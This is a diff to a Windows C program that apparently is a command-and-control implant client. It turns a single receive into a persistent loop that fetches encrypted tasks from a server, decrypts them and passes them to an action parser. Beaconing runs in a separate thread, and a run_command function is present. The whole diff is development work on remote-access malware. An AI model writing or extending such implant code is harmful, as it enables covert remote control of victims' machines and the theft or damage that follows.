@@ -742,37 +742,6 @@ char* run_command(const char* command) {
     return output ? output : _strdup("");
 }
 
-// Function to handle connection and communication
-void handle_connection() {
-    char buffer[CHUNK_SIZE] = {0};
-    
-    // Receive data from the client socket
-    int valread = recv(client_socket, buffer, sizeof(buffer) - 1, 0);
-    
-    // Check if data was read successfully
-    if (valread > 0) {
-        // Null-terminate the buffer to ensure it is a valid C string
-        buffer[valread] = '\0';
-        
-        // Decrypt the data
-        char* decrypted = decrypt_data(buffer, SESSION_ID);
-        if (decrypted) {
-            // Parse the decrypted data
-            parse_action(decrypted);
-            // Free the decrypted data buffer
-            free(decrypted);
-        } else {
-            log_it("Decryption failed");
-        }
-    } else if (valread == 0) {
-        // Connection was closed gracefully
-        log_it("Socket disconnected.");
-    }
-    
-    // Optionally, clear the buffer explicitly (not strictly necessary as it's overwritten)
-    ZeroMemory(buffer, sizeof(buffer));
-}
-
 // Function to convert sockaddr to IP address and port
 char* get_peer_info(SOCKET sock) {
     static char ip_str[INET6_ADDRSTRLEN]; // Static buffer to hold IP address
@@ -880,6 +849,35 @@ int connect_to_server() {
     return 0;
 }
 
+int receive_and_process_data() {
+    char buffer[CHUNK_SIZE] = {0};
+    int valread = recv(client_socket, buffer, sizeof(buffer) - 1, 0);
+    
+    if (valread > 0) {
+        buffer[valread] = '\0';
+        log_it("Received Data: %s", buffer);
+
+        char* decrypted = decrypt_data(buffer, SESSION_ID);
+        if (decrypted) {
+            parse_action(decrypted);
+            free(decrypted);
+            return 1; // Data processed successfully
+        } else {
+            log_it("Decryption failed");
+            return 0; // Decryption failed
+        }
+    } else if (valread == 0) {
+        log_it("Socket disconnected.");
+        return -1; // Connection closed
+    } else {
+        if (WSAGetLastError() != WSAETIMEDOUT) {
+            log_it("recv failed with error: %d", WSAGetLastError());
+            return -2; // Error occurred
+        }
+        return 0; // Timeout, no data received
+    }
+}
+
 int main() {
     log_file = fopen("client.log", "a");
     if (!log_file) {
@@ -893,23 +891,30 @@ int main() {
         if (connect_to_server() < 0) {
             log_it("Failed to connect to server");
             exit_process = TRUE;
-        } else {
-            // Send initial beacon
-            HANDLE beaconThreadHandle = start_beacon_interval();
-            if (beaconThreadHandle != NULL) {
-                // Wait for the thread to complete, if necessary
-                WaitForSingleObject(beaconThreadHandle, INFINITE);
-                
-                // Close the handle when done
-                CloseHandle(beaconThreadHandle);
+            continue;
+        }
+
+        HANDLE beaconThreadHandle = start_beacon_interval();
+
+        while (!exit_process) {
+            int result = receive_and_process_data();
+            if (result < 0) {
+                // Connection closed or error occurred
+                break;
             }
-            handle_connection();
+        }
+
+        if (beaconThreadHandle != NULL) {
+            WaitForSingleObject(beaconThreadHandle, INFINITE);
+            CloseHandle(beaconThreadHandle);
+        }
+
+        if (client_socket != INVALID_SOCKET) {
+            closesocket(client_socket);
+            client_socket = INVALID_SOCKET;
         }
     }
 
-    if (client_socket != INVALID_SOCKET) {
-        closesocket(client_socket);
-    }
     WSACleanup();
     fclose(log_file);
     return 0;
